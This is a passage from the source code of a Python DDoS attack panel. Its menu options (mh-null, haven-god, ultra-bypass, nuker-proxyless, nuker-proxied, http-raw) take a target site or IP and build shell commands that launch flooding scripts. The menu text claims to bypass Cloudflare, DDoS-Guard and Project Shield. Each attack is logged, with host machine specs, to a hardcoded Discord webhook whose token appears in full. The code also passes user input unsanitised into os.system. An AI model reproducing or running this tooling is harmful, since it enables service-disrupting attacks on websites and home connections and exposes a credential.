                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-dyn')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-dyn')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-null":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-null \033[31m: \033[36m Powerfull Layer 7 Attack: NULL \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py null ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-null')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-null')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "haven-god":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mhaven-god \033[31m: \033[36m Verry strong Layer 4 attack for websites, servers and home ips \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    havenip = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                    havensend = ('sudo ./haven -d ' + havenip)
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{havenip}')
                    
                    embed.add_embed_field(name='Method:', value='haven-god')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(havensend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{havenip}')
                    
                    embedx.add_embed_field(name='Method:', value='haven-god')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()


                if menuoption == "ultra-bypass":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39multra-bypass \033[31m: \033[36m Bypasses Blazingfast, DDOS Guard, (js) StormWall , OVH UAM & Cloudflare UAM & Also normal hit could be done \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    ultrabypasswebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWEBSITE (https://google.com) \033[31m:\033[36m\033[31m")
                    ultrabypasstime = input("\033[31m\033[1m⮞ \033[0m\033[96mTIME(seconds) \033[31m:\033[36m\033[31m")
                    couldbeslow = input("\033[31m\033[1m⮞ \033[0m\033[96mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
                    ultrabypassREQ = input("\033[31m\033[1m⮞\033[0m \033[96mThreads-Requests (minimum 5) and write it only in numbers without spaces \033[31m:\033[36m\033[31m")
                    sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request " + ultrabypassREQ)
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{ultrabypasswebsite}')
                    
                    embed.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
                    
                    embed.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
                    embed.add_embed_field(name='Method:', value='ultra-bypass')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(sendultrabypassattack)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{ultrabypasswebsite}')
                    embedx.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
                    
                    embedx.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
                    embedx.add_embed_field(name='Method:', value='ultra-bypass')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='Method:', value='ultra-bypass')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()

                    load()
                    license()
                    menu()
                if menuoption == "nuker-proxyless":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[96mwebsite-nuker-https \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    websitenukerwebsite = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                    timewebsitenuker = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                    sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite}')
                    
                    embed.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
                    embed.add_embed_field(name='Method:', value='nuker-proxyless')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(sendattackwebsitenuker)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite}')
                    
                    embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
                    embedx.add_embed_field(name='Method:', value='nuker-proxyless')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "nuker-proxied":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mwebsite-nuker-https-proxied \033[31m: \033[36m Proxied Attack, Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    websitenukerwebsite1 = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite (https://google.com)\033[31m:\033[36m\033[31m")
                    timewebsitenuker1 = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                    sendattackwebsitenuker1 = ("node website-nuker.js " + websitenukerwebsite1 + " " + timewebsitenuker1)
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite1}')
                    
                    embed.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
                    embed.add_embed_field(name='Method:', value='nuker-proxied')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(sendattackwebsitenuker1)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite1}')
                    
                    embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
                    embedx.add_embed_field(name='Method:', value='nuker-proxyless')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "exit":
                    sys.exit()
                if menuoption == "http-raw":
                    os.system('clear')
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[96mhttp-raw \033[31m: \033[36m Strong RAW ATTACK\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
                    targetraw = input('\033[31m\033[1m⮞ \033[0m\033[96mWebsite \033[31m:\033[36m\033[31m')
                    rawtime = input('\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m')
                    sendrawhttp = ("node HTTP-RAW.js " + targetraw + " " + rawtime)
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{targetraw}')
                    
                    embed.add_embed_field(name='Time:', value=f'{rawtime}')
                    embed.add_embed_field(name='Method:', value='http-raw')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(sendrawhttp)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embed.add_embed_field(name='Attack Stopped for:', value=f'{targetraw}')
                    
                    embed.add_embed_field(name='Time:', value=f'{rawtime}')
                    embedx.add_embed_field(name='Method:', value='http-raw')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    
                    load()
                    license()
                    menu()
                else:
                    wrongoption()
                    license()
                    menu()
            if kies == "mh-projectshield":
                load()
                print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-projectshield \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass PROJECT SHIELD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
